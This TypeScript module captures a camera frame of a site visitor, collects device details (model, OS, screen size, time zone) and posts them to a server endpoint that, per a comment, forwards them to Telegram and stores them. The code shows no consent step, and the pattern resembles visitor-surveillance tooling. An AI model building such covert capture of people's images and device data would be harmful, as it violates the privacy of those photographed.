import { UAParser } from "ua-parser-js";

function getDeviceInfo() {
  const parser = new UAParser(navigator.userAgent);
  const result = parser.getResult();

  const deviceType = result.device.type || "desktop";
  const deviceVendor = result.device.vendor || "";
  const deviceModel = result.device.model || "";

  let device = `${deviceVendor} ${deviceModel}`.trim();
  if (!device) {
    device =
      deviceType === "mobile"
        ? "Mobile"
        : deviceType === "tablet"
          ? "Tablet"
          : "Desktop";
  }

  const os = result.os.name
    ? `${result.os.name} ${result.os.version || ""}`.trim()
    : "Unknown";

  const screenResolution = `${window.screen.width}x${window.screen.height}`;
  const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;

  return {
    device,
    os,
    screenResolution,
    timezone,
  };
}

export const visitorSnapshotService = {
  async captureAndSend(
    videoElement: HTMLVideoElement,
    sessionId?: string | null,
  ): Promise<boolean> {
    try {
      // Create canvas and capture frame
      const canvas = document.createElement("canvas");
      canvas.width = videoElement.videoWidth || 640;
      canvas.height = videoElement.videoHeight || 480;

      const ctx = canvas.getContext("2d");
      if (!ctx) return false;

      ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);

      // Convert to base64
      const imageBase64 = canvas.toDataURL("image/jpeg", 0.85);

      // Get device info
      const deviceInfo = getDeviceInfo();

      // Send to API endpoint (which will forward to Telegram and save to DB)
      const response = await fetch("/api/visitor-snapshot", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          image: imageBase64,
          sessionId: sessionId || null,
          ...deviceInfo,
        }),
      });

      return response.ok;
    } catch {
      return false;
    }
  },
};
